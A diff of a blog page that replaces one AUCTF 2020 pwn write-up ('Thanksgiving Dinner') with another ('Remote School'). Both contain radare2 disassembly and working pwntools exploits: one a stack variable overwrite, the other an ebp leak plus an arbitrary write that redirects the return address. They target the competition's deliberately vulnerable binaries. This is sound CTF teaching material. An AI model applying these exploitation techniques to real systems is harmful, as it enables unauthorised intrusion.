@@ -4,7 +4,7 @@
          
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <title>AUCTF 2020 Writeup - Thanksgiving Dinner</title>
+        <title>AUCTF 2020 Writeup - Remote School</title>
         
         <style>
 
@@ -80,7 +80,7 @@
 
                 <div class="navbar-header">
 
-                    <a class="navbar-brand visible-xs" href="#">AUCTF 2020 Writeup - Thanksgiving Dinner</a>
+                    <a class="navbar-brand visible-xs" href="#">AUCTF 2020 Writeup - Remote School</a>
 
                     <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
                         <span class="icon-bar"></span>
@@ -140,8 +140,8 @@
     
     
 
-    <h4><a href="/post/thanksgiving-dinner-auctf2020/">AUCTF 2020 Writeup - Thanksgiving Dinner</a></h4>
-    <h5>April 19, 2020</h5>
+    <h4><a href="/post/remote-school-auctf2020/">AUCTF 2020 Writeup - Remote School</a></h4>
+    <h5>April 20, 2020</h5>
     
     <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
     
@@ -161,130 +161,211 @@
 
 <h1 id="intro">Intro</h1>
 
-<p>This is the second pwn challenge of AUCTF 2020. It was solved 238 times and it was worth 408 points.</p>
+<p>This is the fourth and last pwn challenge. It was solved 63 times and it was worth 960 points.</p>
 
 <p>Description:</p>
 
 <blockquote>
-<p>I just ate a huge dinner. I can barley eat anymore&hellip; so please don&rsquo;t give me too much!</p>
+<p>Dear Student,</p>
 
-<p>nc challenges.auctf.com 30011</p>
+<p>Due to COVID-19 concerns our curriculum will be moving completely to online courses&hellip; I know we haven&rsquo;t even started our school year yet so this may come as a shock. But I promise it won&rsquo;t be too bad! You can login at challenges.auctf.com 30013.</p>
 
-<p>Note: ASLR is disabled for this challenge</p>
+<p>Best, Dean of Eon Pillars</p>
 </blockquote>
 
-<p>You could download the binary <a href="/binary/auctf2020/thanksgiving_dinner">here</a>.</p>
+<p>You could download the binary <a href="/binary/auctf2020/remote_school">here</a>.</p>
 
-<pre><code class="language-shell">$ sha256sum ./thanksgiving_dinner
-2307af59beead6a2377c3beb2ff26f70d5732ec6b651b5c31e58b8f692bfb70c thanksgiving_dinner
+<pre><code class="language-shell">$ sha256sum remote_school 
+d0639347713b54603db5f8015fc1015ca911fb10ad9d271c31e9630093054664  remote_school
 </code></pre>
 
 <h1 id="exploitation">Exploitation</h1>
 
-<p>The program simply ask for an input. But it seems not vulnerable to a buffer overflow:</p>
+<p>At the startup the program prints a banner and it asks a name. As usual I tried to find a buffer overflow or a format string vulnerability, without success.</p>
 
-<pre><code class="language-shell">$ ./thanksgiving_dinner
-Hi!
-Welcome to my program... it's a little buggy...
-Hey I heard you are searching for flags! Well I've got one. :)
-Here you can have part of it!
-auctf{
+<p>Then it prints a prompt. I also played a bit here, without success.</p>
 
-Sorry that's all I got!
+<p>However the program supports a lot of command:</p>
 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+<pre><code class="language-shell">$ ./remote_school
+Welcome to your new online class!
+We here, at Eon Pillars, we think Zoom is trash and prefer to have our lessions via command line!
+May I get your name?
+	Name: name
+Thanks! It is nice to meet you name!
 
+Well enough of that let's start class ... What should we do?
+&gt; [? for menu]: ?
+
+~~Eon Pillars help menu~~
+
+help: Print help menu
+attend &lt;class&gt;: go to class
+study &lt;class&gt;: study for class
+list: list classes
+stats: check stats
+grades: check grades
+quit: Exit Terminal
+
+What should we do?
+&gt; [? for menu]: 
 </code></pre>
 
-<p>So I checked the binary with checksec. Then I opened with radare2.</p>
+<p>So I analyzed the binary with checksec. It has RWX segment and NX disabled. Weird.</p>
 
-<pre><code class="language-shell">$ checksec ./thanksgiving_dinner
+<pre><code class="language-shell">$ checksec remote_school
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
-    NX:       NX enabled
+    NX:       NX disabled
     PIE:      PIE enabled
-$ r2 -Ad ./thanksgiving_dinner
+    RWX:      Has RWX segments
 </code></pre>
 
-<p>Then I found two promising functions:</p>
+<p>Then I opened with radare2 and I found two promising functions:</p>
 
-<pre><code class="language-shell">[r2]&gt; afl
+<pre><code class="language-shell">$ r2 -Ad ./remote_school
+[r2]&gt; afl
 .....
-0x56556250    7 198          sym.vulnerable
-0x56556360    3 162          sym.print_flag
-....
-[r2]&gt; axt sym.vulnerable
-main 0x5655623c [CALL] call sym.vulnerable
-[r2]&gt; axt sym.print_flag
-sym.vulnerable 0x5655630b [CALL] call sym.print_flag
-</code></pre>
-
-<p>The <code>vulnerable</code> function is called by <code>main</code>. The <code>print_flag</code> function is called by <code>vulnerable</code>.</p>
-
-<p>So here is the interesting part about the latter.</p>
-
-<p>It gets an input a string and if some values are correct <code>print_flag</code> is called. Thanks the <code>fgets</code> we can overwrite those variables easily:</p>
-
-<pre><code class="language-shell">[r2]&gt; pdf @sym.vulnerable
+0x5655699f    1 120          sym.class_hacker
+0x56556299    3 144          sym.print_flag
 .....
-│           0x565562d9      6a24           push 0x24                   ; 36
-│           0x565562db      8d45d4         lea eax, [var_2ch]
-│           0x565562de      50             push eax
-│           0x565562df      e85cfdffff     call sym.imp.fgets
-│           0x565562e4      83c410         add esp, 0x10
-│           0x565562e7      817df4371300.  cmp dword [var_ch], 0x1337
-│       ┌─&lt; 0x565562ee      7520           jne 0x56556310
-│       │   0x565562f0      837df0ec       cmp dword [var_10h], 0xffffffec
-│      ┌──&lt; 0x565562f4      7d1a           jge 0x56556310
-│      ││   0x565562f6      837de814       cmp dword [var_18h], 0x14
-│     ┌───&lt; 0x565562fa      7414           je 0x56556310
-│     │││   0x565562fc      817dec637466.  cmp dword [var_14h], 0x667463
-│    ┌────&lt; 0x56556303      750b           jne 0x56556310
-│    ││││   0x56556305      837de42a       cmp dword [var_1ch], 0x2a
-│   ┌─────&lt; 0x56556309      7505           jne 0x56556310
-│   │││││   0x5655630b      e850000000     call sym.print_flag
-│   └└└└└─&gt; 0x56556310      90             nop
-│           0x56556311      8b5dfc         mov ebx, dword [var_4h]
-│           0x56556314      c9             leave
-└           0x56556315      c3             ret
 </code></pre>
 
-<p>So this is my exploit:</p>
+<p>But there isn&rsquo;t any xref to both functions.
+However, after some digging, I found an interesting object:</p>
+
+<pre><code class="language-shell">[r2]&gt; is
+.....
+40   0x00002ec0 0x56558ec0 LOCAL  OBJ    32        classtable
+.....
+[r2]&gt; pxr 32 @obj.classtable 
+0x56558ec0 0x565570e0  .pUV (.rodata) (Algebra)
+0x56558ec4 0x5655692f  /iUV (.text) sym.class_algebra
+0x56558ec8 0x565570e8  .pUV (.rodata) (CompSci)
+0x56558ecc 0x56556967  giUV (.text) sym.class_compsci
+0x56558ed0 0x565570f0  .pUV (.rodata) (Hacker)
+0x56558ed4 0x5655699f  .iUV (.text) sym.class_hacker
+0x56558ed8 ..[ null bytes ]..   00000000 
+</code></pre>
+
+<p>It seems like an associative array. So I tried to attend the &ldquo;Hacker&rdquo; class, with success.</p>
+
+<p>We have an hexadecimal value (maybe an address) and a segfault:</p>
+
+<pre><code class="language-shell">&gt; [? for menu]: attend Hacker
+
+Welcome!
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Got AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+0xffff8608
+Segmentation fault (core dumped)
+</code></pre>
+
+<p>Let&rsquo;s disassemble <code>class_hacker</code>.</p>
+
+<p>It&rsquo;s a really simple function. It gets the input and then passes it to another function called <code>test</code>:</p>
+
+<pre><code class="language-shell">[r2]&gt; pdf @sym.class_hacler
+.....
+│           0x565569d2      6800200000     push 0x2000
+│           0x565569d7      8d85f8dfffff   lea eax, [var_2008h]
+│           0x565569dd      50             push eax
+│           0x565569de      e87df6ffff     call sym.imp.fgets 
+.....
+│           0x56556a02      8d85f8dfffff   lea eax, [var_2008h]
+│           0x56556a08      50             push eax
+│           0x56556a09      e841fbffff     call sym.test
+</code></pre>
+
+<p>The <code>test</code> function is really interesting and it&rsquo;s the target of the exploitation:</p>
+
+<ul>
+<li>It prints the address of <code>ebp</code>. I highlited the line with the THIS comment.</li>
+<li>It gives us an arbitrary write. I also highlited this line with a comment.</li>
+</ul>
+
+<pre><code class="language-shell">[r2]&gt; pdf @sym.test
+.....
+│           0x56556559      e842fcffff     call sym.__x86.get_pc_thunk.bx
+│           0x5655655e      81c3a22a0000   add ebx, 0x2aa2
+│           0x56556564      55             push ebp
+│           0x56556565      8d83d5e1ffff   lea eax, [ebx - 0x1e2b]
+│           0x5655656b      50             push eax
+│           0x5655656c      e82f0e90a1     call 0xf7e573a0             ; THIS
+│           0x56556571      83ec04         sub esp, 4
+│           0x56556574      6808080000     push 0x808                  ; 2056
+│           0x56556579      ff7508         push dword [arg_8h]
+│           0x5655657c      8d85f0f7ffff   lea eax, [var_810h]
+│           0x56556582      50             push eax
+│           0x56556583      e888fbffff     call sym.imp.strncpy
+│           0x56556588      83c410         add esp, 0x10
+│           0x5655658b      8b45f4         mov eax, dword [var_ch]
+│           0x5655658e      8b55f0         mov edx, dword [var_10h]
+│           0x56556591      8910           mov dword [eax], edx        ; ARBITRARY WRITE
+.....
+</code></pre>
+
+<p>So, with a two step attack, we can overwrite the saved return address (at <code>ebp + 0x4</code>) with the address of <code>print_flag</code>.</p>
+
+<p>This is the exploit:</p>
 
 <pre><code class="language-python">#!/usr/bin/python2
 
 from pwn import *
 
-prog = context.binary = ELF(os.getcwd() + &quot;/turkey&quot;, checksec=False)
+prog = context.binary = ELF(os.getcwd() + &quot;/online&quot;, checksec=False)
 
 if len(sys.argv) &gt; 1:
-        host = &quot;challenges.auctf.com&quot;
-        port = 30011
-        t = remote(host, port)
+	host = &quot;challenges.auctf.com&quot;
+	port = 30013
+	t = remote(host, port)
 else:
 	t = prog.process()
 
-offset = 16
-payload = &quot;A&quot;*offset
-payload += pack(0x2a)       # var_1ch
-payload += pack(0x15)       # var_18h
-payload += pack(0x667463)   # var_14h
-payload += pack(0xffffffeb) # var_10h
-payload += pack(0x1337)     # var_ch
+offset = 2048
+base = 0x56555000
+def init():
+	t.recvuntil(&quot;Name: &quot;)
+	t.sendline(&quot;a_name&quot;)
+	t.recvuntil(&quot;&gt; [? for menu]: &quot;)
+	t.sendline(&quot;attend Hacker&quot;)
+	t.recvuntil(&quot;Welcome!&quot;)
+	payload = &quot;A&quot;*offset
+	payload += &quot;J&quot;*4
+	payload += pack(prog.get_section_by_name(&quot;.data&quot;).header.sh_addr + 0x56556000) # no segfault in this way
+	t.sendline(payload)
+	t.recvuntil(&quot;0x&quot;)
+	leaked = int(&quot;0x&quot; + t.recvuntil(&quot;\n&quot;), 16)
+	return leaked
 
-t.sendline(payload)
+def print_flag(ebp):
+	t.recvuntil(&quot;&gt; [? for menu]: &quot;)
+	t.sendline(&quot;attend Hacker&quot;)
+	t.recvuntil(&quot;Welcome!&quot;)
+	payload = &quot;A&quot;*offset
+	payload += pack(prog.symbols[&quot;print_flag&quot;] + base)
+	payload += pack(ebp + 4)
+	t.sendline(payload)
+
+ebp = init()
+log.info(&quot;ebp @ {:#x}&quot;.format(ebp))
+print_flag(ebp)
+
 t.interactive()
 t.close()
 </code></pre>
 
 <p>And this is the flag:</p>
 
-<pre><code class="language-shell">$ cat flag.txt
-auctf{I_s@id_1_w@s_fu11!}
+<pre><code class="language-shell">$ ./exploit.py
+.....
+auctf{1_hope_you_l1ked_my_g@m3_2321}
+.....
 </code></pre>
 
-<p><img src="/images/auctf2020/thanksgiving_dinner/solved.png" alt="thanksgiving dinner solved banner" /></p>
+<p><img src="/images/auctf2020/remote_school/solved.png" alt="remote school solved banner" /></p>
 </div>
 
     
@@ -303,8 +384,8 @@ auctf{I_s@id_1_w@s_fu11!}
     
     
 
-    <h4><a href="/post/remote-school-auctf2020/">AUCTF 2020 Writeup - Remote School</a></h4>
-    <h5>April 20, 2020</h5>
+    <h4><a href="/post/thanksgiving-dinner-auctf2020/">AUCTF 2020 Writeup - Thanksgiving Dinner</a></h4>
+    <h5>April 19, 2020</h5>
     
     <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
     
